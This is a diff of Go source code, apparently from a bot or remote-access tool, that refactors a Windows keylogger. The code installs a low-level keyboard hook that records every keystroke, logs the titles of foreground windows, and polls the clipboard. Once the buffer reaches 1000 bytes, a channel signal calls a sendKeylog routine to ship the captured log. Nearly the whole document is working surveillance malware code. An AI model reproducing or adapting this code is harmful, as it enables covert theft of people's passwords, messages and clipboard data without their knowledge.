@@ -1,5 +1,3 @@
-//Prune  tmpkeylog to nil and save to encrypted file at x Bytes
-
 // Package components icludes functionalities required for the bot
 package components
 
@@ -13,52 +11,23 @@ import (
 
 func startLogger(mode int) {
 	if mode == 0 { //Normal logger (everything until told to stop)
-		go windowLogger()
 		go startListening()
 		go clipboardLogger()
-		go sendKeylog()
+		go sendKeylog(ch)
 	} else {
 		//Selective Keylogger
 	}
 }
 
-//Get Active Window Title
-// func getForegroundWindow() (hwnd syscall.Handle, err error) {
-// 	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
-// 	if e1 != 0 {
-// 		err = error(e1)
-// 		return
-// 	}
-// 	hwnd = syscall.Handle(r0)
-// 	return
-// }
-
-// func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
-// 	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
-// 	len = int32(r0)
-// 	if len == 0 {
-// 		if e1 != 0 {
-// 			err = error(e1)
-// 		} else {
-// 			err = syscall.EINVAL
-// 		}
-// 	}
-// 	return
-// }
-
-func windowLogger() {
-	for {
-		g := w32.GetForegroundWindow()
-		title := w32.GetWindowText(g)
-
-		if title != "" {
-			if tmpTitle != title {
-				tmpTitle = title
-				tmpKeylog += string("\r\n[" + title + "]\r\n")
-			}
-		}
-		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
+func windowLogger(hook w32.HWINEVENTHOOK, event w32.DWORD, hwnd w32.HWND, idObject w32.LONG, idChild w32.LONG, dwEventThread w32.DWORD, dwmsEventTime w32.DWORD) uintptr {
+	if event == w32.EVENT_SYSTEM_FOREGROUND {
+		title := w32.GetWindowText(hwnd)
+		tmpKeylog.WriteString("\r\n[" + title + "]\r\n")
 	}
+	if tmpKeylog.Len() >= 1000 || false {
+		ch <- struct{}{}
+	}
+	return 0
 }
 
 func clipboardLogger() {
@@ -67,7 +36,7 @@ func clipboardLogger() {
 		text, _ := clipboard.ReadAll()
 		if text != tmp {
 			tmp = text
-			tmpKeylog += string("\r\n[Clipboard: " + text + "]\r\n")
+			tmpKeylog.WriteString("\r\n[Clipboard: " + text + "]\r\n")
 		}
 		time.Sleep(time.Duration(randInt(3, 7)) * time.Second)
 	}
@@ -89,423 +58,430 @@ func keyLogger(nCode int, wparam w32.WPARAM, lparam w32.LPARAM) w32.LRESULT {
 		switch code {
 
 		case vkCONTROL:
-			tmpKeylog += "[Ctrl]"
+			tmpKeylog.WriteString("[Ctrl]")
 		case vkBACK:
-			tmpKeylog += "[Back]"
+			tmpKeylog.WriteString("[Back]")
 		case vkTAB:
-			tmpKeylog += "[Tab]"
+			tmpKeylog.WriteString("[Tab]")
 		case vkRETURN:
-			tmpKeylog += "[Enter]\r\n"
+			tmpKeylog.WriteString("[Enter]\r\n")
 		case vkSHIFT:
-			tmpKeylog += "[Shift]"
+			tmpKeylog.WriteString("[Shift]")
 		case vkMENU:
-			tmpKeylog += "[Alt]"
+			tmpKeylog.WriteString("[Alt]")
 		case vkCAPITAL:
-			tmpKeylog += "[CapsLock]"
+			tmpKeylog.WriteString("[CapsLock]")
 			if caps {
 				caps = false
 			} else {
 				caps = true
 			}
 		case vkESCAPE:
-			tmpKeylog += "[Esc]"
+			tmpKeylog.WriteString("[Esc]")
 		case vkSPACE:
-			tmpKeylog += " "
+			tmpKeylog.WriteString(" ")
 		case vkPRIOR:
-			tmpKeylog += "[PageUp]"
+			tmpKeylog.WriteString("[PageUp]")
 		case vkNEXT:
-			tmpKeylog += "[PageDown]"
+			tmpKeylog.WriteString("[PageDown]")
 		case vkEND:
-			tmpKeylog += "[End]"
+			tmpKeylog.WriteString("[End]")
 		case vkHOME:
-			tmpKeylog += "[Home]"
+			tmpKeylog.WriteString("[Home]")
 		case vkLEFT:
-			tmpKeylog += "[Left]"
+			tmpKeylog.WriteString("[Left]")
 		case vkUP:
-			tmpKeylog += "[Up]"
+			tmpKeylog.WriteString("[Up]")
 		case vkRIGHT:
-			tmpKeylog += "[Right]"
+			tmpKeylog.WriteString("[Right]")
 		case vkDOWN:
-			tmpKeylog += "[Down]"
+			tmpKeylog.WriteString("[Down]")
 		case vkSELECT:
-			tmpKeylog += "[Select]"
+			tmpKeylog.WriteString("[Select]")
 		case vkPRINT:
-			tmpKeylog += "[Print]"
+			tmpKeylog.WriteString("[Print]")
 		case vkEXECUTE:
-			tmpKeylog += "[Execute]"
+			tmpKeylog.WriteString("[Execute]")
 		case vkSNAPSHOT:
-			tmpKeylog += "[PrintScreen]"
+			tmpKeylog.WriteString("[PrintScreen]")
 		case vkINSERT:
-			tmpKeylog += "[Insert]"
+			tmpKeylog.WriteString("[Insert]")
 		case vkDELETE:
-			tmpKeylog += "[Delete]"
+			tmpKeylog.WriteString("[Delete]")
 		case vkLWIN:
-			tmpKeylog += "[LeftWindows]"
+			tmpKeylog.WriteString("[LeftWindows]")
 		case vkRWIN:
-			tmpKeylog += "[RightWindows]"
+			tmpKeylog.WriteString("[RightWindows]")
 		case vkAPPS:
-			tmpKeylog += "[Applications]"
+			tmpKeylog.WriteString("[Applications]")
 		case vkSLEEP:
-			tmpKeylog += "[Sleep]"
+			tmpKeylog.WriteString("[Sleep]")
 		case vkNUMPAD0:
-			tmpKeylog += "[Pad 0]"
+			tmpKeylog.WriteString("[Pad 0]")
 		case vkNUMPAD1:
-			tmpKeylog += "[Pad 1]"
+			tmpKeylog.WriteString("[Pad 1]")
 		case vkNUMPAD2:
-			tmpKeylog += "[Pad 2]"
+			tmpKeylog.WriteString("[Pad 2]")
 		case vkNUMPAD3:
-			tmpKeylog += "[Pad 3]"
+			tmpKeylog.WriteString("[Pad 3]")
 		case vkNUMPAD4:
-			tmpKeylog += "[Pad 4]"
+			tmpKeylog.WriteString("[Pad 4]")
 		case vkNUMPAD5:
-			tmpKeylog += "[Pad 5]"
+			tmpKeylog.WriteString("[Pad 5]")
 		case vkNUMPAD6:
-			tmpKeylog += "[Pad 6]"
+			tmpKeylog.WriteString("[Pad 6]")
 		case vkNUMPAD7:
-			tmpKeylog += "[Pad 7]"
+			tmpKeylog.WriteString("[Pad 7]")
 		case vkNUMPAD8:
-			tmpKeylog += "[Pad 8]"
+			tmpKeylog.WriteString("[Pad 8]")
 		case vkNUMPAD9:
-			tmpKeylog += "[Pad 9]"
+			tmpKeylog.WriteString("[Pad 9]")
 		case vkMULTIPLY:
-			tmpKeylog += "*"
+			tmpKeylog.WriteString("*")
 		case vkADD:
 			if shift {
-				tmpKeylog += "+"
+				tmpKeylog.WriteString("+")
 			} else {
-				tmpKeylog += "="
+				tmpKeylog.WriteString("=")
 			}
 		case vkSEPARATOR:
-			tmpKeylog += "[Separator]"
+			tmpKeylog.WriteString("[Separator]")
 		case vkSUBTRACT:
 			if shift {
-				tmpKeylog += "_"
+				tmpKeylog.WriteString("_")
 			} else {
-				tmpKeylog += "-"
+				tmpKeylog.WriteString("-")
 			}
 		case vkDECIMAL:
-			tmpKeylog += "."
+			tmpKeylog.WriteString(".")
 		case vkDIVIDE:
-			tmpKeylog += "[Devide]"
+			tmpKeylog.WriteString("[Devide]")
 		case vkF1:
-			tmpKeylog += "[F1]"
+			tmpKeylog.WriteString("[F1]")
 		case vkF2:
-			tmpKeylog += "[F2]"
+			tmpKeylog.WriteString("[F2]")
 		case vkF3:
-			tmpKeylog += "[F3]"
+			tmpKeylog.WriteString("[F3]")
 		case vkF4:
-			tmpKeylog += "[F4]"
+			tmpKeylog.WriteString("[F4]")
 		case vkF5:
-			tmpKeylog += "[F5]"
+			tmpKeylog.WriteString("[F5]")
 		case vkF6:
-			tmpKeylog += "[F6]"
+			tmpKeylog.WriteString("[F6]")
 		case vkF7:
-			tmpKeylog += "[F7]"
+			tmpKeylog.WriteString("[F7]")
 		case vkF8:
-			tmpKeylog += "[F8]"
+			tmpKeylog.WriteString("[F8]")
 		case vkF9:
-			tmpKeylog += "[F9]"
+			tmpKeylog.WriteString("[F9]")
 		case vkF10:
-			tmpKeylog += "[F10]"
+			tmpKeylog.WriteString("[F10]")
 		case vkF11:
-			tmpKeylog += "[F11]"
+			tmpKeylog.WriteString("[F11]")
 		case vkF12:
-			tmpKeylog += "[F12]"
+			tmpKeylog.WriteString("[F12]")
 		case vkNUMLOCK:
-			tmpKeylog += "[NumLock]"
+			tmpKeylog.WriteString("[NumLock]")
 		case vkSCROLL:
-			tmpKeylog += "[ScrollLock]"
+			tmpKeylog.WriteString("[ScrollLock]")
 		case vkLSHIFT:
-			tmpKeylog += "[LeftShift]"
+			tmpKeylog.WriteString("[LeftShift]")
 		case vkRSHIFT:
-			tmpKeylog += "[RightShift]"
+			tmpKeylog.WriteString("[RightShift]")
 		case vkLCONTROL:
-			tmpKeylog += "[LeftCtrl]"
+			tmpKeylog.WriteString("[LeftCtrl]")
 		case vkRCONTROL:
-			tmpKeylog += "[RightCtrl]"
+			tmpKeylog.WriteString("[RightCtrl]")
 		case vkLMENU:
-			tmpKeylog += "[LeftMenu]"
+			tmpKeylog.WriteString("[LeftMenu]")
 		case vkRMENU:
-			tmpKeylog += "[RightMenu]"
+			tmpKeylog.WriteString("[RightMenu]")
 		case vkOEM1:
 			if shift {
-				tmpKeylog += ":"
+				tmpKeylog.WriteString(":")
 			} else {
-				tmpKeylog += ";"
+				tmpKeylog.WriteString(";")
 			}
 		case vkOEM2:
 			if shift {
-				tmpKeylog += "?"
+				tmpKeylog.WriteString("?")
 			} else {
-				tmpKeylog += "/"
+				tmpKeylog.WriteString("/")
 			}
 		case vkOEM3:
 			if shift {
-				tmpKeylog += "~"
+				tmpKeylog.WriteString("~")
 			} else {
-				tmpKeylog += "`"
+				tmpKeylog.WriteString("`")
 			}
 		case vkOEM4:
 			if shift {
-				tmpKeylog += "{"
+				tmpKeylog.WriteString("{")
 			} else {
-				tmpKeylog += "["
+				tmpKeylog.WriteString("[")
 			}
 		case vkOEM5:
 			if shift {
-				tmpKeylog += "|"
+				tmpKeylog.WriteString("|")
 			} else {
-				tmpKeylog += "\\"
+				tmpKeylog.WriteString("\\")
 			}
 		case vkOEM6:
 			if shift {
-				tmpKeylog += "}"
+				tmpKeylog.WriteString("}")
 			} else {
-				tmpKeylog += "]"
+				tmpKeylog.WriteString("]")
 			}
 		case vkOEM7:
 			if shift {
-				tmpKeylog += `"`
+				tmpKeylog.WriteString(`"`)
 			} else {
-				tmpKeylog += "'"
+				tmpKeylog.WriteString("'")
 			}
 		case vkOEMPERIOD:
 			if shift {
-				tmpKeylog += ">"
+				tmpKeylog.WriteString(">")
 			} else {
-				tmpKeylog += "."
+				tmpKeylog.WriteString(".")
 			}
 		case 0x30:
 			if shift {
-				tmpKeylog += ")"
+				tmpKeylog.WriteString(")")
 			} else {
-				tmpKeylog += "0"
+				tmpKeylog.WriteString("0")
 			}
 		case 0x31:
 			if shift {
-				tmpKeylog += "!"
+				tmpKeylog.WriteString("!")
 			} else {
-				tmpKeylog += "1"
+				tmpKeylog.WriteString("1")
 			}
 		case 0x32:
 			if shift {
-				tmpKeylog += "@"
+				tmpKeylog.WriteString("@")
 			} else {
-				tmpKeylog += "2"
+				tmpKeylog.WriteString("2")
 			}
 		case 0x33:
 			if shift {
-				tmpKeylog += "#"
+				tmpKeylog.WriteString("#")
 			} else {
-				tmpKeylog += "3"
+				tmpKeylog.WriteString("3")
 			}
 		case 0x34:
 			if shift {
-				tmpKeylog += "$"
+				tmpKeylog.WriteString("$")
 			} else {
-				tmpKeylog += "4"
+				tmpKeylog.WriteString("4")
 			}
 		case 0x35:
 			if shift {
-				tmpKeylog += "%"
+				tmpKeylog.WriteString("%")
 			} else {
-				tmpKeylog += "5"
+				tmpKeylog.WriteString("5")
 			}
 		case 0x36:
 			if shift {
-				tmpKeylog += "^"
+				tmpKeylog.WriteString("^")
 			} else {
-				tmpKeylog += "6"
+				tmpKeylog.WriteString("6")
 			}
 		case 0x37:
 			if shift {
-				tmpKeylog += "&"
+				tmpKeylog.WriteString("&")
 			} else {
-				tmpKeylog += "7"
+				tmpKeylog.WriteString("7")
 			}
 		case 0x38:
 			if shift {
-				tmpKeylog += "*"
+				tmpKeylog.WriteString("*")
 			} else {
-				tmpKeylog += "8"
+				tmpKeylog.WriteString("8")
 			}
 		case 0x39:
 			if shift {
-				tmpKeylog += "("
+				tmpKeylog.WriteString("(")
 			} else {
-				tmpKeylog += "9"
+				tmpKeylog.WriteString("9")
 			}
 		case 0x41:
 			if caps || shift {
-				tmpKeylog += "A"
+				tmpKeylog.WriteString("A")
 			} else {
-				tmpKeylog += "a"
+				tmpKeylog.WriteString("a")
 			}
 		case 0x42:
 			if caps || shift {
-				tmpKeylog += "B"
+				tmpKeylog.WriteString("B")
 			} else {
-				tmpKeylog += "b"
+				tmpKeylog.WriteString("b")
 			}
 		case 0x43:
 			if caps || shift {
-				tmpKeylog += "C"
+				tmpKeylog.WriteString("C")
 			} else {
-				tmpKeylog += "c"
+				tmpKeylog.WriteString("c")
 			}
 		case 0x44:
 			if caps || shift {
-				tmpKeylog += "D"
+				tmpKeylog.WriteString("D")
 			} else {
-				tmpKeylog += "d"
+				tmpKeylog.WriteString("d")
 			}
 		case 0x45:
 			if caps || shift {
-				tmpKeylog += "E"
+				tmpKeylog.WriteString("E")
 			} else {
-				tmpKeylog += "e"
+				tmpKeylog.WriteString("e")
 			}
 		case 0x46:
 			if caps || shift {
-				tmpKeylog += "F"
+				tmpKeylog.WriteString("F")
 			} else {
-				tmpKeylog += "f"
+				tmpKeylog.WriteString("f")
 			}
 		case 0x47:
 			if caps || shift {
-				tmpKeylog += "G"
+				tmpKeylog.WriteString("G")
 			} else {
-				tmpKeylog += "g"
+				tmpKeylog.WriteString("g")
 			}
 		case 0x48:
 			if caps || shift {
-				tmpKeylog += "H"
+				tmpKeylog.WriteString("H")
 			} else {
-				tmpKeylog += "h"
+				tmpKeylog.WriteString("h")
 			}
 		case 0x49:
 			if caps || shift {
-				tmpKeylog += "I"
+				tmpKeylog.WriteString("I")
 			} else {
-				tmpKeylog += "i"
+				tmpKeylog.WriteString("i")
 			}
 		case 0x4A:
 			if caps || shift {
-				tmpKeylog += "J"
+				tmpKeylog.WriteString("J")
 			} else {
-				tmpKeylog += "j"
+				tmpKeylog.WriteString("j")
 			}
 		case 0x4B:
 			if caps || shift {
-				tmpKeylog += "K"
+				tmpKeylog.WriteString("K")
 			} else {
-				tmpKeylog += "k"
+				tmpKeylog.WriteString("k")
 			}
 		case 0x4C:
 			if caps || shift {
-				tmpKeylog += "L"
+				tmpKeylog.WriteString("L")
 			} else {
-				tmpKeylog += "l"
+				tmpKeylog.WriteString("l")
 			}
 		case 0x4D:
 			if caps || shift {
-				tmpKeylog += "M"
+				tmpKeylog.WriteString("M")
 			} else {
-				tmpKeylog += "m"
+				tmpKeylog.WriteString("m")
 			}
 		case 0x4E:
 			if caps || shift {
-				tmpKeylog += "N"
+				tmpKeylog.WriteString("N")
 			} else {
-				tmpKeylog += "n"
+				tmpKeylog.WriteString("n")
 			}
 		case 0x4F:
 			if caps || shift {
-				tmpKeylog += "O"
+				tmpKeylog.WriteString("O")
 			} else {
-				tmpKeylog += "o"
+				tmpKeylog.WriteString("o")
 			}
 		case 0x50:
 			if caps || shift {
-				tmpKeylog += "P"
+				tmpKeylog.WriteString("P")
 			} else {
-				tmpKeylog += "p"
+				tmpKeylog.WriteString("p")
 			}
 		case 0x51:
 			if caps || shift {
-				tmpKeylog += "Q"
+				tmpKeylog.WriteString("Q")
 			} else {
-				tmpKeylog += "q"
+				tmpKeylog.WriteString("q")
 			}
 		case 0x52:
 			if caps || shift {
-				tmpKeylog += "R"
+				tmpKeylog.WriteString("R")
 			} else {
-				tmpKeylog += "r"
+				tmpKeylog.WriteString("r")
 			}
 		case 0x53:
 			if caps || shift {
-				tmpKeylog += "S"
+				tmpKeylog.WriteString("S")
 			} else {
-				tmpKeylog += "s"
+				tmpKeylog.WriteString("s")
 			}
 		case 0x54:
 			if caps || shift {
-				tmpKeylog += "T"
+				tmpKeylog.WriteString("T")
 			} else {
-				tmpKeylog += "t"
+				tmpKeylog.WriteString("t")
 			}
 		case 0x55:
 			if caps || shift {
-				tmpKeylog += "U"
+				tmpKeylog.WriteString("U")
 			} else {
-				tmpKeylog += "u"
+				tmpKeylog.WriteString("u")
 			}
 		case 0x56:
 			if caps || shift {
-				tmpKeylog += "V"
+				tmpKeylog.WriteString("V")
 			} else {
-				tmpKeylog += "v"
+				tmpKeylog.WriteString("v")
 			}
 		case 0x57:
 			if caps || shift {
-				tmpKeylog += "W"
+				tmpKeylog.WriteString("W")
 			} else {
-				tmpKeylog += "w"
+				tmpKeylog.WriteString("w")
 			}
 		case 0x58:
 			if caps || shift {
-				tmpKeylog += "X"
+				tmpKeylog.WriteString("X")
 			} else {
-				tmpKeylog += "x"
+				tmpKeylog.WriteString("x")
 			}
 		case 0x59:
 			if caps || shift {
-				tmpKeylog += "Y"
+				tmpKeylog.WriteString("Y")
 			} else {
-				tmpKeylog += "y"
+				tmpKeylog.WriteString("y")
 			}
 		case 0x5A:
 			if caps || shift {
-				tmpKeylog += "Z"
+				tmpKeylog.WriteString("Z")
 			} else {
-				tmpKeylog += "z"
+				tmpKeylog.WriteString("z")
 			}
 		}
+	}
+	// counts bytes. Should add time based log sending
+	if tmpKeylog.Len() >= 1000 || false {
+		ch <- struct{}{}
 	}
 	return w32.CallNextHookEx(keyboardHook, nCode, wparam, lparam)
 }
 
 func startListening() {
-	defer cleanup()
 	keyboardHook = w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, keyLogger, 0, 0)
-	var msg w32.MSG
-	for w32.GetMessage(&msg, 0, 0, 0) != 0 {
-	}
-
+	gHook = w32.SetWinEventHook(w32.EVENT_SYSTEM_FOREGROUND, w32.EVENT_SYSTEM_FOREGROUND, 0, windowLogger, 0, 0, w32.WINEVENT_SKIPOWNPROCESS)
+	cleanup()
+	// quit <- struct{}{}
 }
 
 func cleanup() {
-	w32.UnhookWindowsHookEx(keyboardHook)
-	keyboardHook = 0
+	select {
+	case <-quit:
+		w32.UnhookWindowsHookEx(keyboardHook)
+		w32.UnhookWinEvent(gHook)
+		keyboardHook = 0
+		gHook = 0
+	}
 }
